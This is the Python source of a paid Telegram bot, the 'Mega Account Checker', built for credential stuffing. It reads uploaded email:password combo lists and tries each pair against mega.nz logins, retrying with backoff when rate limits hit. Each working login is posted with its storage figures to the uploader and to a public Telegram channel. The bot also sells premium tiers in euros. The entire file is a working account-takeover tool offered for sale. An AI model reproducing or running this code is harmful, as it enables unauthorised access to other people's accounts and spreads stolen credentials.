from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from mega import Mega
import os
import concurrent.futures
from queue import Queue
import threading
import time
from random import uniform
import logging
import json
import psutil
import asyncio
import certifi
import sys
from datetime import datetime, timedelta

# Configure logging to stdout
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

# Configuration
CONFIG = {
    "TELEGRAM_BOT_TOKEN": os.getenv("TELEGRAM_BOT_TOKEN"),
    "TELEGRAM_CHANNEL_ID": "-1002213612052",  # @Valid_EDU_Mail
    "ADMIN_USER_ID": 5978396634,
    "SUBSCRIPTION_DURATIONS": {
        "1_week": 7,
        "1_month": 30,
        "3_months": 90,
        "6_months": 180,
        "1_year": 365
    },
    "PRICING": {
        "1_week": "5€",
        "1_month": "15€",
        "3_months": "40€",
        "6_months": "70€",
        "1_year": "120€"
    },
    "FILE_LIMITS": {
        "FREE_USER": 2 * 1024 * 1024,  # 2MB
        "PREMIUM_USER": 50 * 1024 * 1024  # 50MB
    },
    "DAILY_LIMITS": {
        "FREE_USER": 1,
        "PREMIUM_USER": 5
    },
    "CLEANUP_INTERVAL": 10,
    "MAX_THREADS": 2,  # Reduced for Koyeb free tier
}

# Global variables
ALLOWED_USER_IDS = {5978396634}
processing_queue = Queue()
current_processing = None
user_data = {}
processing_stats = {}
processing_lock = threading.Lock()
last_activity_time = time.time()
system_stats = {"total_processed": 0, "total_valid": 0, "total_invalid": 0}

# File Manager (simplified for in-memory operations)
class FileManager:
    @staticmethod
    async def save_file(file, file_path):
        try:
            await file.download_to_drive(file_path)
            return True
        except Exception as e:
            logger.error(f"Failed to save file {file_path}: {str(e)}")
            return False

# Mega Validator
class MegaValidator:
    @staticmethod
    def validate_credentials(email, password, user_id, context, max_retries=5):
        for attempt in range(max_retries):
            try:
                mega = Mega()
                account = mega.login(email, password)
                storage_info = account.get_storage_space()
                total_used = storage_info['used'] / (1024**3)
                total_storage = storage_info['total'] / (1024**3)
                logger.info(f"Valid credentials found for {email}")
                return True, total_used, total_storage, None
            except Exception as e:
                error_str = str(e)
                if "Too many requests" in error_str and attempt < max_retries - 1:
                    time.sleep((2 ** attempt) + uniform(0.5, 1.5))
                    continue
                return False, None, None, error_str

# Bot Utilities
class BotUtils:
    @staticmethod
    def update_activity_time():
        global last_activity_time
        last_activity_time = time.time()

    @staticmethod
    def format_timedelta(td):
        seconds = int(td.total_seconds())
        periods = [
            ('year', 60*60*24*365), ('month', 60*60*24*30), ('day', 60*60*24),
            ('hour', 60*60), ('minute', 60), ('second', 1)
        ]
        parts = []
        for period_name, period_seconds in periods:
            if seconds >= period_seconds:
                period_value, seconds = divmod(seconds, period_seconds)
                parts.append(f"{period_value} {period_name}{'s' if period_value != 1 else ''}")
        return ", ".join(parts[:2]) if parts else "0 seconds"

# System Monitoring
def monitor_system():
    while True:
        try:
            cpu_usage = psutil.cpu_percent(interval=1)
            if cpu_usage > 85:
                logger.warning(f"High CPU usage: {cpu_usage}%")
            mem = psutil.virtual_memory()
            if mem.percent > 90:
                logger.warning(f"High memory usage: {mem.percent}%")
            time.sleep(5)
        except Exception as e:
            logger.error(f"System monitoring error: {str(e)}")
            time.sleep(10)

# User Data Management
def load_user_data():
    global user_data
    user_data = {
        "users": {
            str(CONFIG["ADMIN_USER_ID"]): {
                "subscription_type": "infinite",
                "start_date": "",
                "end_date": "",
                "is_admin": True,
                "file_count": 0,
                "last_submission": datetime.now().date().isoformat()
            }
        },
        "system": {"created_at": datetime.now().isoformat(), "version": "1.0"}
    }
    logger.info("User data initialized")

def save_user_data():
    logger.info("User data not saved to disk on Koyeb (ephemeral storage)")

def reset_daily_limits():
    today = datetime.now().date().isoformat()
    with processing_lock:
        for user_id, data in list(user_data["users"].items()):
            if data["subscription_type"] != "infinite" and data.get("last_submission") != today:
                user_data["users"][user_id]["file_count"] = 0
                user_data["users"][user_id]["last_submission"] = today
        save_user_data()
    logger.info("Daily limits reset")
    schedule_daily_reset()

def schedule_daily_reset():
    now = datetime.now()
    next_day = now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)
    delay = (next_day - now).total_seconds()
    threading.Timer(delay, reset_daily_limits).start()
    logger.info(f"Scheduled daily reset in {BotUtils.format_timedelta(timedelta(seconds=delay))}")

# Telegram Notification
async def send_to_telegram(email, password, total_used, total_storage, chat_id):
    message = (
        f"[VALID]\n"
        f"[mega.nz]\n"
        f"MAIL: {email}\n"
        f"PASSWORD: {password}\n"
        f"Used: {total_used:.2f} GB / {total_storage:.2f} GB\n"
        f"🔗 <a href='https://t.me/Valid_EDU_Mail'>Join Channel</a>"
    )
    try:
        await Application.bot.send_message(
            chat_id=chat_id,
            text=message,
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Failed to send message to {chat_id}: {str(e)}")

# Queue Processing
async def process_queue():
    global current_processing, processing_stats
    while True:
        try:
            with processing_lock:
                if not processing_queue.empty() and current_processing is None:
                    current_processing = processing_queue.get_nowait()
                    user_id = current_processing[0]
                    processing_stats[user_id] = {"total": 0, "valid": 0, "invalid": 0}
                    BotUtils.update_activity_time()
                    logger.info(f"Started processing for user {user_id}")
            if current_processing:
                user_id, file_path, context = current_processing
                try:
                    await process_user_file(user_id, file_path, context)
                except Exception as e:
                    logger.error(f"Error processing file for user {user_id}: {str(e)}")
                    await context.bot.send_message(
                        chat_id=user_id,
                        text="❌ Error processing your file. Please try again later."
                    )
                with processing_lock:
                    if user_id in processing_stats:
                        del processing_stats[user_id]
                    current_processing = None
                    BotUtils.update_activity_time()
                await asyncio.sleep(10)
            await asyncio.sleep(1)
        except Exception as e:
            logger.error(f"Queue processing error: {str(e)}")
            await asyncio.sleep(5)

async def process_user_file(user_id, file_path, context):
    global processing_stats, system_stats
    await context.bot.send_message(chat_id=user_id, text="🔍 Starting Mega account validation...")
    logger.info(f"Starting validation for user {user_id}")

    try:
        with open(file_path, "r") as f:
            credentials_list = [line for line in f.readlines() if ':' in line.strip()]
            with processing_lock:
                processing_stats[user_id]["total"] = len(credentials_list)
                system_stats["total_processed"] += len(credentials_list)
            logger.info(f"Processing {len(credentials_list)} credentials for user {user_id}")

        chunk_size = 100
        valid_credentials = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=CONFIG["MAX_THREADS"]) as executor:
            for i in range(0, len(credentials_list), chunk_size):
                chunk = credentials_list[i:i + chunk_size]
                futures = {
                    executor.submit(
                        MegaValidator.validate_credentials,
                        cred.strip().split(':', 1)[0],
                        cred.strip().split(':', 1)[1],
                        user_id,
                        context
                    ): cred for cred in chunk
                }
                for future in concurrent.futures.as_completed(futures):
                    cred = futures[future]
                    is_valid, total_used, total_storage, error = future.result()
                    try:
                        email, password = cred.strip().split(':', 1)
                    except ValueError:
                        continue
                    if is_valid:
                        valid_credentials.append((email, password, total_used, total_storage))
                        await send_to_telegram(email, password, total_used, total_storage, user_id)
                        await send_to_telegram(email, password, total_used, total_storage, CONFIG["TELEGRAM_CHANNEL_ID"])
                        with processing_lock:
                            processing_stats[user_id]["valid"] += 1
                            system_stats["total_valid"] += 1
                    else:
                        with processing_lock:
                            processing_stats[user_id]["invalid"] += 1
                            system_stats["total_invalid"] += 1
                    if (processing_stats[user_id]["valid"] + processing_stats[user_id]["invalid"]) % max(1, len(credentials_list) // 10) == 0:
                        with processing_lock:
                            stats = processing_stats.get(user_id, {})
                            progress = int((stats["valid"] + stats["invalid"]) / stats["total"] * 100)
                        await context.bot.send_message(
                            chat_id=user_id,
                            text=f"⏳ Progress: {progress}%\n✅ Valid: {stats['valid']}\n❌ Invalid: {stats['invalid']}"
                        )
                        await asyncio.sleep(0.5)

        with processing_lock:
            stats = processing_stats.get(user_id, {})
        result_message = (
            f"🎉 Validation Complete!\n"
            f"📊 Total: {stats.get('total', 0)}\n"
            f"✅ Valid: {stats.get('valid', 0)}\n"
            f"❌ Invalid: {stats.get('invalid', 0)}"
        )
        await context.bot.send_message(chat_id=user_id, text=result_message)
        logger.info(f"Completed validation for user {user_id}: {result_message}")

    except Exception as e:
        logger.error(f"Error processing user file {file_path}: {str(e)}")
        raise
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

# Telegram Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ALLOWED_USER_IDS:
        await update.message.reply_text("🚫 You are not authorized to use this bot.")
        return
    keyboard = [
        [InlineKeyboardButton("Upload Combo File", callback_data="upload")],
        [InlineKeyboardButton("Instructions", callback_data="instructions")],
        [InlineKeyboardButton("Pricing", callback_data="pricing")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"👋 Hello {update.effective_user.first_name}!\n"
        "Welcome to the Mega Account Checker Bot! 🎉\n"
        "Send a .txt file with email:password pairs.\n"
        "Choose an option below:",
        reply_markup=reply_markup
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if user_id not in ALLOWED_USER_IDS:
        await query.message.reply_text("🚫 You are not authorized to use this bot.")
        return
    if query.data == "instructions":
        await query.message.reply_text(
            "📋 *Instructions*:\n"
            "1. Prepare a .txt file with email:password pairs (e.g., user@example.com:pass123).\n"
            "2. Upload the file using the 'Upload Combo File' button.\n"
            "3. Receive real-time valid account notifications.\n"
            f"⚡ Free: {CONFIG['DAILY_LIMITS']['FREE_USER']} file (2MB)/day\n"
            f"⭐ Premium: {CONFIG['DAILY_LIMITS']['PREMIUM_USER']} files (50MB)/day\n"
            "📬 Contact @Valid_EDU_Mail_Bot for premium access."
        )
    elif query.data == "upload":
        await query.message.reply_text(
            "📂 Please upload a .txt file named 'combo.txt' with email:password pairs."
        )
    elif query.data == "pricing":
        pricing = "\n".join([f"{k.replace('_', ' ')}: {v}" for k, v in CONFIG["PRICING"].items()])
        await query.message.reply_text(
            f"💲 *Pricing*:\n{pricing}\n"
            "📬 Contact @Valid_EDU_Mail_Bot to purchase premium."
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ALLOWED_USER_IDS:
        await update.message.reply_text("🚫 You are not authorized to use this bot.")
        return
    if current_processing and current_processing[0] == user_id:
        await update.message.reply_text("⏳ A file is already being processed. Wait for it to complete.")
        return
    document = update.message.document
    if document.file_name.lower() != "combo.txt":
        await update.message.reply_text("❌ File must be named 'combo.txt'.")
        return
    is_premium = check_premium_status(user_id)
    max_size = CONFIG["FILE_LIMITS"]["PREMIUM_USER"] if is_premium else CONFIG["FILE_LIMITS"]["FREE_USER"]
    if document.file_size > max_size:
        await update.message.reply_text(f"❌ Max size: {max_size//(1024*1024)}MB for {'premium' if is_premium else 'free'} users.")
        return
    today = datetime.now().date().isoformat()
    if user_id not in user_data["users"]:
        user_data["users"][str(user_id)] = {
            "subscription_type": "free",
            "start_date": today,
            "end_date": today,
            "is_admin": False,
            "file_count": 0,
            "last_submission": today
        }
    if user_data["users"][str(user_id)]["last_submission"] != today:
        user_data["users"][str(user_id)]["file_count"] = 0
        user_data["users"][str(user_id)]["last_submission"] = today
    max_files = CONFIG["DAILY_LIMITS"]["PREMIUM_USER"] if is_premium else CONFIG["DAILY_LIMITS"]["FREE_USER"]
    if user_data["users"][str(user_id)]["file_count"] >= max_files:
        await update.message.reply_text(f"❌ Daily limit reached: {max_files} file(s).")
        return
    file = await context.bot.get_file(document.file_id)
    unique_timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    file_path = f"combo_{user_id}_{unique_timestamp}.txt"
    if not await FileManager.save_file(file, file_path):
        await update.message.reply_text("❌ Failed to save file. Please try again.")
        return
    user_data["users"][str(user_id)]["file_count"] += 1
    save_user_data()
    with processing_lock:
        processing_queue.put((user_id, file_path, context))
    queue_position = processing_queue.qsize()
    if current_processing:
        queue_position += 1
    await update.message.reply_text(
        f"📁 File added to queue\n"
        f"📊 Position: {queue_position}\n"
        f"👤 User ID: {user_id}\n"
        f"⭐ Premium: {'Yes' if is_premium else 'No'}"
    )
    BotUtils.update_activity_time()

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ALLOWED_USER_IDS:
        await update.message.reply_text("🚫 You are not authorized to use this bot.")
        return
    is_premium = check_premium_status(user_id)
    with processing_lock:
        if current_processing and current_processing[0] == user_id:
            stats = processing_stats.get(user_id, {})
            if stats:
                progress = int((stats["valid"] + stats["invalid"]) / stats["total"] * 100)
                await update.message.reply_text(
                    f"🔧 Processing your file:\n"
                    f"📊 Progress: {progress}%\n"
                    f"✅ Valid: {stats['valid']}\n"
                    f"❌ Invalid: {stats['invalid']}\n"
                    f"👤 User ID: {user_id}\n"
                    f"⭐ Premium: {'Yes' if is_premium else 'No'}"
                )
                return
        queue_size = processing_queue.qsize()
        if current_processing:
            queue_size += 1
    in_queue = False
    with processing_lock:
        for item in list(processing_queue.queue):
            if item[0] == user_id:
                in_queue = True
                break
    if in_queue:
        await update.message.reply_text(
            f"⏳ Your file is in queue\n"
            f"📊 Position: {queue_size}\n"
            f"👤 User ID: {user_id}\n"
            f"⭐ Premium: {'Yes' if is_premium else 'No'}"
        )
    else:
        await update.message.reply_text(
            f"ℹ️ No active file processing or in queue\n"
            f"👤 User ID: {user_id}\n"
            f"⭐ Premium: {'Yes' if is_premium else 'No'}"
        )

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != CONFIG["ADMIN_USER_ID"]:
        await update.message.reply_text("🚫 Admin only")
        return
    with processing_lock:
        queue_size = processing_queue.qsize()
        current_job = current_processing[0] if current_processing else None
    today = datetime.now().date().isoformat()
    daily_subs = sum(1 for data in user_data["users"].values() if data.get("last_submission") == today)
    stats_msg = (
        f"📊 *Bot Statistics*\n\n"
        f"👥 Users: {len(user_data['users'])}\n"
        f"📨 Today's files: {daily_subs}\n\n"
        f"⚙️ *Queue*\n"
        f"• Processing: {current_job or 'None'}\n"
        f"• Waiting: {queue_size}\n\n"
        f"🛠️ *System*\n"
        f"• Total Processed: {system_stats['total_processed']}\n"
        f"• Total Valid: {system_stats['total_valid']}\n"
        f"• Total Invalid: {system_stats['total_invalid']}\n"
        f"• Premium users: {len([user for user in user_data['users'].values() if user['subscription_type'] != 'free'])}"
    )
    await update.message.reply_text(stats_msg, parse_mode="HTML")

def check_premium_status(user_id):
    user_info = user_data["users"].get(str(user_id))
    if not user_info:
        return False
    if user_info["subscription_type"] == "infinite":
        return True
    end_date = datetime.strptime(user_info["end_date"], "%Y-%m-%d").date()
    if end_date >= datetime.now().date():
        return True
    else:
        user_info["subscription_type"] = "free"
        save_user_data()
        return False

async def add_premium_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != CONFIG["ADMIN_USER_ID"]:
        await update.message.reply_text("🚫 Admin only")
        return
    if len(context.args) != 2:
        await update.message.reply_text("❌ Usage: /addpremium <user_id> <duration>")
        return
    user_id = context.args[0]
    duration = context.args[1]
    if duration not in CONFIG["SUBSCRIPTION_DURATIONS"]:
        await update.message.reply_text(f"❌ Invalid duration. Choose from: {', '.join(CONFIG['SUBSCRIPTION_DURATIONS'].keys())}")
        return
    start_date = datetime.now().date()
    end_date = start_date + timedelta(days=CONFIG["SUBSCRIPTION_DURATIONS"][duration])
    user_data["users"][user_id] = {
        "subscription_type": duration,
        "start_date": start_date.isoformat(),
        "end_date": end_date.isoformat(),
        "is_admin": False,
        "file_count": 0,
        "last_submission": start_date.isoformat()
    }
    save_user_data()
    await update.message.reply_text(f"✅ Added premium subscription for user {user_id} for {duration.replace('_', ' ')}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pricing = "\n".join([f"{k.replace('_', ' ')}: {v}" for k, v in CONFIG["PRICING"].items()])
    await update.message.reply_text(
        "👋 *Welcome to the Mega Account Checker Bot!*\n\n"
        "💼 *Commands*:\n"
        "/start - Start interacting\n"
        "/status - Check processing status\n"
        "/stats - View bot stats (Admin only)\n"
        "/addpremium <user_id> <duration> - Add premium user (Admin only)\n"
        "/help - Show this message\n\n"
        f"⚡ Free: {CONFIG['DAILY_LIMITS']['FREE_USER']} file (2MB)/day\n"
        f"⭐ Premium: {CONFIG['DAILY_LIMITS']['PREMIUM_USER']} files (50MB)/day\n\n"
        f"💲 *Pricing*:\n{pricing}\n"
        "📬 Contact @Valid_EDU_Mail_Bot for premium."
    )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")
    if update and update.message:
        await update.message.reply_text("❌ An error occurred. Please try again or contact @Valid_EDU_Mail_Bot.")

def main():
    if CONFIG["TELEGRAM_BOT_TOKEN"] == "your-bot-token-here":
        logger.error("Please set a valid bot token via TELEGRAM_BOT_TOKEN environment variable.")
        return
    load_user_data()
    schedule_daily_reset()
    threading.Thread(target=monitor_system, daemon=True).start()
    os.environ["REQUESTS_CA_BUNDLE"] = certifi.where()
    application = Application.builder().token(CONFIG["TELEGRAM_BOT_TOKEN"]).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("stats", stats))
    application.add_handler(CommandHandler("addpremium", add_premium_user))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_error_handler(error_handler)
    application.job_queue.run_once(lambda _: application.create_task(process_queue()), 0)
    logger.info("Mega Account Checker Bot is running...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
